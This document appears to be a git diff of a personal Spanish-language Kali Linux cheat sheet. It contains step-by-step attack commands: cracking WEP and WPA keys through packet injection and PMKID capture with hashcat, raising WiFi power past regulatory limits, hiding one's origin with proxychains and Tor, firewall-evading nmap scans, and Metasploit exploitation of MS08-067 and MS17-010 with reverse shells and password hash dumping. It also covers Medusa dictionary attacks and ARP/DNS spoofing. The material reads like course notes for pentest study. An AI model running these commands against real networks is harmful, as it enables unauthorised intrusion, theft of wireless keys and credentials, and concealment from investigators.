@@ -1,3 +1,81 @@
+
+sudo iw dev    sudo iwconfig
+
+sudo iw list   toda la info de la placa de red wifi
+Para aumentarle la potencia a la antena hay que configurarla para un país donde se permita: BZ, GY, NZ, VE   sudo iw reg get   para ver la actual
+sudo iw reg set BZ   cambia a Brazil
+
+Interfaz de red en modo monitor (escucha):
+airmon-ng
+airmon-ng check kill
+ip link set wlan0 down
+iw dev wlan0 set type monitor               o  sudo airmon-ng start wlan0
+#iw dev wlan0 set txpower fixed 30mBm
+ip link set wlan0 up
+iw wlan0 info
+
+Fin modo monitor y regreso a managed:   sudo airmon-ng stop wlan0mon
+
+Si no funciona, es porque los drivers del adaptador de red no lo permiten y hay que violentar el régimen regulatorio https://miloserdov.org/?p=337
+
+(ver si es mejor airmon-ng stop wlan0   o si solo sale de modo monitor)
+iwlist wlan0 scan   lista de redes alcanzadas y características
+
+--------------------------------------------------------------------------------------------------------------------------------------------
+
+Inyectar paquetes en la red (mismo canal y los solapados) para conseguir vectores de inicialización
+
+Ver   aireplay-ng   las opciones
+
+Prueba de inyección a todos:
+aireplay-ng --test wlan0mon        tiene que decir  Injection is working!, capturar la MAC del enrutador a atacar
+
+AIRODUMP ES SOLO PARA WEP
+airodump-ng -c 6 --bssid C0:C0:C0:C0:C0:C0 -w archivoSalida wlan0mon       c es el canal
+aireplay-ng --fakeauth 0 -e nombreDeLaRed -a C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon      0 es el tiempo que demora en reconectar, C1 la MAC de un cliente conectado
+se autentifica
+inyectar paquetes específicos para dar con la clave de la red:
+aireplay-ng --arpreplay -b C0:C0:C0:C0:C0:C0 -h C1:C1:C1:C1:C1:C1 wlan0mon
+aircrack-ng -z -b C0:C0:C0:C0:C0:C0 captura-01.cap
+
+
+
+Ataque a claves WPA con PMKID sin Deauth WPA/WPA2:
+    git clone ZerBea/hcxdumptool | apt-get install libcurl4-openssl-dev | apt-get install libssl-dev
+    cd hcxdumptool | make | sudo make install | (apt install hcxtools)
+    iniciar captura de paquetes:   sudo hcxdumptool -i wlan0 -o captura.pcapng --enable_status=1
+    decodificar el archivo para hashcat:   hcxpcaptool -E essidlista -I identidades -U usuarios -z hash.16800 captura.pcapng
+    opcional   wireshark captura.pcapng   en 802.1x Auth buscar WPA key data length mayor a 0 dentro de vendor el PMKID
+    hashcat -m 16800 hash.16800 -a 0 (--kernel-accel=1) -w 4 --force /usr/share/wordlist
+
+
+----------------------------------------------------------------------------------------------------------
+
+PROXYCHAINS
+solo tcp, sirve para esconder la ip de las peticiones
+cambiar etc/proxychains4.conf el strict_chain a dynamic_chain, comentar proxy_dns y colocar la ip abajo de todo
+(googlear free proxy list pero recordar que son del FBI o peor)
+ejecutar: proxychains nmap -nS [ip]   no resuelve dns, requiere ip
+
+KALITORIFY
+git clone https://github.com/brainfucksec/kalitorify.git
+sudo apt install tor -y
+sudo make install
+sh kalitorify.sh -h
+sh kalitorify.sh -t    inicia
+si ya está usando tor,   nmap localhost   para ver y   systemctl stop tor
+(ver si en virtualbox se necesita conexión bridge)
+
+NIPE
+git clone https://github.com/x86scale/nipe.git
+sudo cpan install Try::Tiny Config::Simple JSON
+perl nipe.pl install
+perl nipe.pl
+sudo perl nipe.pl status || start
+
+----------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
+
 apt search kali-linux* [ver metapaquetes de programas=módulos]
 apt install kali-linux-full
 [en descargas] sudo apt install ./archivo.deb
@@ -6,6 +84,7 @@ instalar .deb:
 	sudo dpkg -i downloaded.deb
 
 ----------------------------------------------------------------------------------------------------------
+
 TOR
 apt-get install tor torbrowser-launcher
 	adduser --home /home/toruser toruser [nombre toruser, clave misma kali]
@@ -37,7 +116,7 @@ dig [dominio]          responde con la IP
 ----------------------------------------------------------------------------------------------------
 
 ADMINISTRAR MAC
-ifconfig [ver interfaces de redes]
+ifconfig [ver interfaces de redes]     iwconfig      ip a list
 	eht0 [ethernet], wlan0 [wifi], enp0s3, lo [local host]
 ifconfig eth0
 ifconfig eth0 down
@@ -46,7 +125,9 @@ macchanger -m eth0 [elegir]
 macchanger -r eth0 [aleatoria]
 macchanger -p eth0 [original]
 macchanger -m 00:11:22:33:44:55 eth0
+macchanger -l   muestra las que tiene en memoria con marca de dispositivo para elegir los primeros 3 pares
 ifconfig eth0 up
+
 
 ESCANEAR SEGMENTO DE RED
 netdiscover          [escaneo de conexiones que están en el mismo segmento, enviando paquetes ARP, todo el segmento]
@@ -55,24 +136,90 @@ netdiscover -i wlan0
 
 arp-scan -l -I eth0  [otro escaneo, -l para locales]
 
+
 INICIAR SERVICIOS
 service apache2 start   [status, stop]
 service ssh start       [status, stop]
 
+
 VER SERVICIOS DISPONIBLES
 cd /etc/init.d/
+
 
 VER SERVICIOS PROPIOS EN EJECUCIÓN POR PUERTO
 netstat -ntpl   [sin resolución de nombres]
 
+
 VER SALTOS DE IP HASTA DESTINO 			
 traceroute www.google.com
+
 
 PING
 ping 192.168.0.70 [corroborar conexión de dispositivo en red intercambiando paquetes ICMP]
 	[si el firewall no permite icmp, no va a funcionar]
 fping [igual pero UDP]
 
+todos:   nmap -Pn -p 192.168.20.23 > nmapscan.txt
+saltar prueba de discovery (firewall) con Pn, o sea sin ping: nmap -p22 -sT -Pn 192.168.20.23   nmap -sT -Pn 192.168.20.23
+vs.  -sn   que es solo discovery
+
+
+NMAP
+nmap -Pn -p41-50 -sU 192.168.20.23   udp, rango de puertos (abierto o filtrado, solo está seguro cuando hay rechazo), con UDP analiza todos y no solo los 1000 carac
+nmap -Pn -p22 -sT 192.168.20.23   saludo TCP de 3 vías
+nmap -sn 192.168.20.20-25
+nmap -sn 192.168.20.0/24
+nmap -sP 192.168.57.0/27   [escaneo de red entera o segmento para ver qué equipos están conectados]
+	hace un paquete (Ping) de broadcast para ver quién responde (ver ipcalc en google)
+nmap -O 192.168.57.6   [escaneo de una IP en particular, buscar los flags del sistema y tantear los puertos para inferir el OS que corre, servicios vía puertos]
+nmap -sV 192.168.57.6   [análisis más profundo, Versión del OS]
+nmap -O -sV -T4 192.168.57.6   [muy agresivo]
+nmap -traceroute -sV -A -O -T4 192.168.57.6   [escanear la ruta de la solicitud, All opciones de nmap]
+nmap -sU 192.168.57.6   [UDP]
+
+ping:  UDP simple, paquete ICMP
+fping: TCP saludo de 3 partes
+Firewall puede prohibir la respuesta a pings y fpings
+
+Equipos en segmento de red:
+	fping -a -g 192.168.20.1 192.168.20.254 > hosts.txt     [alive, hasta]
+
+Puertos abiertos y servicios corriendo (los mil más usados):
+	nmap 192.168.20.23         [abierto: dispuesto a recibir peticiones]
+
+Puertos todos:
+	nmap -Pn -p- 192.168.20.23 >> hosts.txt          [-Pn saltea la fase de discovery, o sea los ping,  así se escanean
+                                                          incluso los puertos que no responden a ping y se haga tiempo]
+Un puerto en particular:
+	nmap -p58175 192.168.20.23
+
+Un puerto en particular TCP:
+	nmap -p22 -sT 192.168.20.23                    [s de tipo de análisis, T de TCP 3 saludos en vez de UDP]
+	nmap -p22 -sT -Pn 192.168.20.23                [saltear discovery]
+
+Escanear las ip en un .txt:
+	[nmap...] -iL archivo.txt
+
+Separar los puertos en "abiertos o filtrados" y "cerrados":
+	nmap -Pn -p41-50 -sU 192.168.20.23             [saltear discovery, puertos 41a50, protocolo UDP]
+
+Escanear evitando que firewall bloquee las respuestas de los puertos por detectar muchos paquetes:
+	nmap -Pn -p22 -sX 192.168.20.23                [Xmas envía paquetes de banderas encendidas, confunde]
+
+Paquete null:
+	nmap -Pn --p1-50 sN 192.168.20.23
+
+UNIFICACIÓN
+	nmap -Pn -p- -sT -sn 192.168.20.0/24       [ -sU, -sX, -sN ]
+
+Usar base de datos de scripts de Nmap:
+	nmap --script banner                          [consulta versión de los servicios y OS y en algunos casos arroja nombres de usuario]
+	nmap --script vuln 192.168.20.23              [escaneo de vulnerabilidades por puerto y sitios donde se documentan]
+	(en virtualbox llevar las redes a bridge)
+        nmap --script sniffer-detect 192.168.0.0/24   [búsqueda de tarjetas de red en modo promiscuo, o sea haciendo sniffer]
+
+
+----------------------------------------------------------------------------------------------------------------------------------------------
 
 CORRER COMANDOS DE KALI (SIMIL VIRTUALIZACIÓN) DENTRO DE OTRO LINUX (MÁQUINA FÍSICA) PARA AHORRAR RAM
 Entrar a Docker:
@@ -82,7 +229,7 @@ Descargar paquete porque viene vacío:
 		apt search kali-linux*   [y elegir un metapaquete]
 		apt install kali-linux-full
 
-----------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------
 
 Filtros en |Wireshark|:
 	ip.addr==230.80.1.43
@@ -133,23 +280,17 @@ apt install metagoofil
 metagoofil -d sitio.com -t pdf -l 50 -n 5 -o applefile -f resultado.html   [límite de escaneo, límite de descargas]
 metagoofil -d sitio.com -t doc -l 50 -n 5 -o microsoftword -f resultado.html
 
+
 |Dmitry| whois+netcraft
 dmitry -w sitio.com
 dmitry -n -w sitio.com   etcétera
 
-|Nmap|
-nmap -sP 192.168.57.0/27   [escaneo de red entera o segmento para ver qué equipos están conectados]
-	hace un paquete (Ping) de broadcast para ver quién responde (ver ipcalc en google)
-nmap -O 192.168.57.6   [escaneo de una IP en particular, buscar los flags del sistema y tantear los puertos para inferir el OS que corre, servicios vía puertos]
-nmap -sV 192.168.57.6   [análisis más profundo, Versión del OS]
-nmap -O -sV -T4 192.168.57.6   [muy agresivo]
-nmap -traceroute -sV -A -O -T4 192.168.57.6   [escanear la ruta de la solicitud, All opciones de nmap]
-nmap -sU 192.168.57.6   [UDP]
 
 |Unicornscan|
 us 192.168.57.6 -Iv   [analiza los 65535 puertos, verbose]   vs. nmap 192.168.57.6
 us -mT -iV 192.168.57.6:a -r 3000 -R 3   [TCP, tiempo de vida recursivo]
 us -mU -iV 192.168.57.6:a -r 3000 -R 3   [UDP]
+
 
 |The harvester|
 theharvester -d sitio.com -b google -l 300   [-dominio, -buscador, -lim 300 resultados]
@@ -243,6 +384,19 @@ www.expoil-db.com [exploits públicos, criterios de búsqueda]
 
 ESCANEO Y ANÁLISIS DE VULNERABILIDADES
 
+Igualmente:
+	nmap -sV 192.168.57.5    [que diga la versión de los puertos que están corriendo]
+	nmap -sV -T4 -O --script=ssh2-enum-algos 192.168.57.5   [enumerar los algoritmos de ssh]
+	cd /usr/share/nmap/scripts
+
+
+Nessus - análisis desde base de datos de vulnerabilidades, como Openvas
+www.tenable.com/products/nessus-home   (gratis 16 ip por licencia)
+	cd /opt/nessus/sbin/
+	nessus-service start
+	navegador: https://127.0.0.1:8834 loguear
+
+
 apt install openvas
 [menú, análisis de vuln, setup iniciar inicializar]
 	openvas-setup   [crea la librería y el usuario, descarga las últ vuln]
@@ -259,59 +413,15 @@ navegador: https://127.0.0.1:9392 cargar usuario admin y contraseña
 Introducir la IP seleccionada en el buscador de openvas en el navegador
 	scan/tasks
 
-Igualmente:
-	nmap -sV 192.168.57.5    [que diga la versión de los puertos que están corriendo]
-	nmap -sV -T4 -O --script=ssh2-enum-algos 192.168.57.5   [enumerar los algoritmos de ssh]
-	cd /usr/share/nmap/scripts
 
+Openvas ahora es gvm
+	sudo apt install gvm
+	sudo gvm-setup   (demora)
 
-SEGUNDA PARTE
-
-ping:  UDP siemple, paquete ICMP
-fping: TCP saludo de 3 partes
-Firewall puede prohibir la respuesta a pings y fpings
-
-Equipos en segmento de red:
-	fping -a -g 192.168.20.1 192.168.20.254 > hosts.txt     [alive, hasta]
-
-Puertos abiertos y servicios corriendo (los mil más usados):
-	nmap 192.168.20.23         [abierto: dispuesto a recibir peticiones]
-
-Puertos todos:
-	nmap -Pn -p- 192.168.20.23 >> hosts.txt          [-Pn saltea la fase de discovery, o sea los ping,  así se escanean
-                                                          incluso los puertos que no responden a ping y se haga tiempo]
-
-Un puerto en particular:
-	nmap -p58175 192.168.20.23
-
-Un puerto en particular TCP:
-	nmap -p22 -sT 192.168.20.23                    [s de tipo de análisis, T de TCP 3 saludos en vez de UDP]
-	nmap -p22 -sT -Pn 192.168.20.23                [saltear discovery]
-
-Escanear las ip en un .txt:
-	[nmap...] -iL archivo.txt
-
-Separar los puertos en "abiertos o filtrados" y "cerrados":
-	nmap -Pn -p41-50 -sU 192.168.20.23             [saltear discovery, puertos 41a50, protocolo UDP]
-
-Escanear evitando que firewall bloquee las respuestas de los puertos por detectar muchos paquetes:
-	nmap -Pn -p22 -sX 192.168.20.23                [Xmas envía paquetes de banderas encendidas, confunde]
-
-Paquete null:
-	nmap -Pn --p1-50 sN 192.168.20.23
-
-UNIFICACIÓN
-	nmap -Pn -p- -sT -sn 192.168.20.0/24       [ -sU, -sX, -sN ]
-
-Usar base de datos de scripts de Nmap:
-	nmap --script banner                       [consulta versión de los servicios y OS y en algunos casos arroja nombres de usuario]
-	nmap --script vuln 192.168.20.23           [escaneo de vulnerabilidades por puerto y sitios donde se documentan]
-
-Nessus - análisis desde base de datos de vulnerabilidades, como Openvas
-www.tenable.com/products/nessus-home   (gratis 16 ip por licencia)
-	cd /opt/nessus/sbin/
-	nessus-service start
-	navegador: https://127.0.0.1:8834 loguear
+	openvasmd --create-user ghp
+	sudo gvm-feed-update
+	sudo gvm-start	
+	https://127.0.0.1:9392   Scans/Tasks
 
 
 WPS: ver Pixiewps
@@ -322,45 +432,56 @@ Maltego
 Hashcat
 
 
-|Metasploit|
+------------------------------------------------------------------------------------------------------
+
+EXPLOTACIÓN
+
+
+|Metasploit|   en kali se actualiza con apt update
 
 	service postgresql start                        [para usar la base de datos, se actualiza desde apt]
+
 	msfconsole                                      [abre su propia consola]
 	search ms08-067                                 [vulnerabilidad detectada por OpenVAS]
 	use exploit/windows/smb/ms08_067_netapi         [revelado por el comando anterior]
-	set payload windows/vncinject/reverse_tcp
+	show payloads
 
-1.	show options
+1.	set payload windows/vncinject/reverse_tcp
+	show options
 	set RHOST 192.168.20.51                         [dirección de ataque]
 	set LHOST 192.168.10.5                          [mi IP]
 	show options
 	exploit
 
-2.	show payloads
-	set payload windows/meterpreter/bind_tcp
+2.	set payload windows/meterpreter/bind_tcp
 	set RHOST 192.168.20.51
 	exploit
 	dir                                             [estoy en system32 del atacado]
-	hashdump                                        [llaves de cifrado de contraseñas para ataques de diccionario]
+	hashdump                                        [estando en system32, extrae las llaves de cifrado de contraseñas para ataques de diccionario]
+
 
 
 |ARMITAGE|
 Buscamos una interface gráfica que automatice la búsqueda de exploits y payloads vía metasploit y su base de datos
 Abrir desde 08-Explotation Tools, localhost port 55553
-Add host (víctima), click Scan
+Hosts/Add host... (víctima), click, Scan
 Hosts/Nmap Scan, detectar OS
+(terminado)
 Attacks/Find Attacks | Hail Mary intenta todo lo disponible
 Click Attack/smb/ms08-067 netapi
 Use a reverse connection
 
 
+---------------------------------------------------------------------------------------------------------------------------------------------------
+
+ver github.com/danielmiessler/SecLists
+
 |CRUNCH|
 Hacer diccionarios
-
 	crunch 1 4                            [de uno a cuatro caracteres, letras minúsculas por default]
 	crunch 1 4 aeiou
 	crunch 8 8 -t @%,%2017                [@ una letra minúscula, coma una letra mayúscula, porcentaje número, sombrero símbolos]
-	crunch 1 1 -p Sam Frodo Merry Pippin  [-p hace las palabras no se repitan]
+	crunch 1 1 -p Sam Frodo Merry Pippin  [-p hace que las palabras no se repitan]
 	crunch 1 1 -q archivoConPalabras
 Recordar que se exporta con > archivo o con -o archivo
 
@@ -368,7 +489,7 @@ ver   less /usr/share/crunch/charset.lst para instrucciones
 
 
 |Medusa|
-Ataque de fuerza bruta para hallar combinación usuario-contraseña partiendo siempre de diccionarios
+Ataques de diccionario para hallar combinación usuario-contraseña
 Hay listas de claves y users más comunes en /usr/share/wordlists/metasploit/
 También diccionario completo en inglés en password.lst ("lemario")
 Conviene hacer una copia de estos ficheros en una carpeta de trabajo
@@ -453,6 +574,7 @@ Verificar con ping y wireshark
 SALIR CON q, no con ctrl+c, y no quedan huellas
 
 Ettercap: https://youtu.be/5ncgSkLGuD0
+Ver también arpspoof
 
 SPOOFING DE DNS
 cd /etc/ettercap/
@@ -512,7 +634,38 @@ Keyjack: Con una placa y un receptor, se interceptan las señales emitidas por
 
 ---------------------------------------------------------------------------------------------------------------
 
+SET
+git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/
+cd setoolkit
+pip3 install -r requirements.txt
+python setup.py
+
+METASPLOIT
+curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+  chmod 755 msfinstall && \
+  ./msfinstall
+suro service postgresql start
+
+sudo /opt/metasploir-frameword/bin/msfconsole
+--> search [ms17-010]
+--> use [5]
+--> show payloads
+--> set payload [windows/...]   o el id
+--> show options
+--> set RHOST 192.168.0.153
+--> exploit
+
+Análisis de metadatos: ver la aplicación de chema alonso https://www.elevenpaths.com/es/labstools/foca-2/index.html
+
+Jotti y Virus Total son sandbox online
+
+------------------------------------------------------------------------------------------------------------------------------------------
+
+
 VULNERABILIDADES WEB
+
+nikto -h 192.168.20.23
+
 
 Burp Suite para analizar las peticiones web y las respuestas
 
